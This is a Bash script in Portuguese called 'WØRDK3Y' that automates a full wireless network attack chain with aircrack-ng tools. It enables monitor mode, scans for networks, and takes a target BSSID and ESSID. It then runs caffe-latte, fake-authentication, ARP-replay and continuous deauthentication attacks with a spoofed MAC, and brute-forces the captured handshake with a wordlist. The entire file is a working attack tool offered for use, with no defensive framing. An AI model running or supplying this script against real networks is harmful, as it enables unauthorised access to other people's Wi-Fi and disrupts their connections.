#!/bin/bash
#Coder: Psychøraptor; Agent-2k40


Wordkey(){
	clear;
	echo "============================================================"
	echo "»»»»»»»»»»»»»»»»»»»»»»»»   WØRDK3Y   «««««««««««««««««««««««"
	echo "============================================================"
}
Inicio(){
	echo "------------------------------------------------------------"
	echo " _ _ "
	echo "(˘©˘) Uma boa quebra consiste em uma boa Wordlist!"
	echo ""
	echo '"DarkBunny, estamos sempre proximos."'
	echo "------------------------------------------------------------"
	echo ""
	echo ""

	echo "[!] Mantenha este terminal aberto"
}
Wordlist(){
        export -f Wordkey;
        export -f Pula;

        Wordkey; Pula;

        read -p "[+] Caminho da wordlist: " WORDLIST;
	Pula;
}
Pack(){
        read -p '[+] Caminho do arquivo "HandShake: "' PACK
        Pula;
	Limpa;
}
Tempo(){
	read -p "[*] Quanto tempo entre aberturas de terminais(seg): " TEMPO;
}
Interface(){
	read -p "[+] Qual interface usar » " PLACA;
}
Interface_mon(){
	read -p "[+] Insira interface[mon] » " PLACA_MON;
}
Interface_ok(){
	read -p "[+] Interface gerada 'mon' [y ou n] » " REPLY;
}
Limpa(){
	clear;
}
Espera(){
	sleep 3;
}
Sair(){
	exit;
}
Pula(){
	echo "";
}
Airmon_win(){
	export -f Wordkey;
	export -f Interface;
	export -f Limpa;
	export -f Espera;
	export -f Pula;
	export -f Sair;

	gnome-terminal -x  bash -c 'Wordkey; Pula; iwconfig; Pula; Interface; Limpa; Wordkey; Pula; echo "[*] Interface escolhida »  $PLACA"; Pula; Pula; echo "[!] Preparando interface[mon]"; Pula; sudo airmon-ng start $PLACA; Limpa; Wordkey; Pula; iwconfig; sleep 1; Sair; exec bash'
}
Airmon(){
	export -f Airmon_win;

	Airmon_win;
}
Airodump_win(){
	export -f Wordkey;
	export -f Limpa;
	export -f Pula;
	export -f Sair;
	export -f Espera;
	export -f Interface_mon;

	gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Iniciando busca por redes"; Limpa; Wordkey; iwconfig; Pula; Interface_mon; Limpa; Wordkey; Pula; echo "[!] Preparando e iniciando busca por redes"; Pula; sudo airodump-ng $PLACA_MON; exec bash';
}
Airodump(){
	export -f Airodump_win;

	Airodump_win;
}
Alvo(){
	export -f Espera;
	export -f Limpa;

	echo "[!] Alvo encontrado"; Pula; echo "[!] Informações de ataque deverão ser informadas"; Limpa; iwconfig; Pula; read -p "[*] Insira interface[mon] » " PLACA_MON; Pula; read -p "Insira BSSID » " BSSID; read -p "Insira ESSID » " ESSID; read -p "Insira CHANNEL » " CANAL;
}
Alvo_airodump(){
	export -f Wordkey;
	export -f Alvo;
	export -f Espera;
	export -f Limpa;
	export -f Pula;

	export PLACA_MON;
	export ESSID;
	export BSSID;
	export CANAL;

	gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Ataque de recolhimento"; Pula; echo "[!] Iniciando"; Pula; sudo airodump-ng --bssid $BSSID --essid $ESSID --channel $CANAL --write $ESSID $PLACA_MON; exec bash'
}
Alvo_caffe(){
	export -f Wordkey;
        export -f Alvo;
        export -f Espera;
        export -f Limpa;
        export -f Pula;

	export PLACA_MON;
	export ESSID;
	export BSSID;
	export CANAL;

        gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Ataque de requisição IVs"; Pula; echo "[+] Iniciando"; Pula; sudo aireplay-ng -6 -b $BSSID -e $ESSID -h 30:B5:C2:B8:19:D0 --ignore-negative-one $PLACA_MON; exec bash'
}
Alvo_fakeauth(){
	export -f Wordkey;
	export -f Espera;
	export -f Limpa;
        export -f Pula;

        export PLACA_MON;
        export ESSID;
        export BSSID;
        export CANAL;

	gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Ataque de falsa autenticação"; Pula; echo "[+] Iniciando"; Pula; sudo aireplay-ng -1 0 -q 4 -a $BSSID -e $ESSID -h 30:B5:C2:B8:19:D0 --ignore-negative-one $PLACA_MON; exec bash'
}
Alvo_ARP(){
        export -f Wordkey;
        export -f Espera;
        export -f Limpa;
        export -f Pula;

        export PLACA_MON;
        export ESSID;
        export BSSID;
        export CANAL;

        gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Ataque de Requisição ARP"; Pula; echo "[+] Iniciando"; Pula; sudo aireplay-ng -3 -a $BSSID -e $ESSID -h 30:B5:C2:B8:19:D0 --ignore-negative-one $PLACA_MON; exec bash'
}
Alvo_deauth(){
	export -f Wordkey;
        export -f Espera;
        export -f Limpa;
        export -f Pula;

        export PLACA_MON;
        export ESSID;
        export BSSID;
        export CANAL;

        gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Ataque de desautenticação"; Pula; echo "[!] Iniciando"; Pula; sudo aireplay-ng -0 0 -a $BSSID -e $ESSID --ignore-negative-one $PLACA_MON'
}
Alvo_crack(){
	export -f Wordkey;
	export -f Wordlist;
	export -f Pack;
	export -f Espera;
	export -f Limpa;
	export -f Pula;

	gnome-terminal -x bash -c 'Wordkey; Pula; echo "[!] Aguarde o Handshake"; Pula; echo "[!] Apenas após a captura do Handshake de continuidade"; Wordlist; Pack; clear; Wordkey; Pula; echo "[!] Ataque de brute-force";  sudo aircrack-ng -w$WORDLIST $PACK; exec bash'
}

#øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø
Wordkey
Pula
Inicio
Pula
Tempo
Airmon
sleep $TEMPO
Airodump
sleep $TEMPO

Pula
Alvo

Alvo_airodump
sleep 10
Alvo_caffe
sleep 10
Alvo_fakeauth
sleep 10
Alvo_deauth
sleep 10
Alvo_ARP
sleep 10
Alvo_crack
#øøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøøø
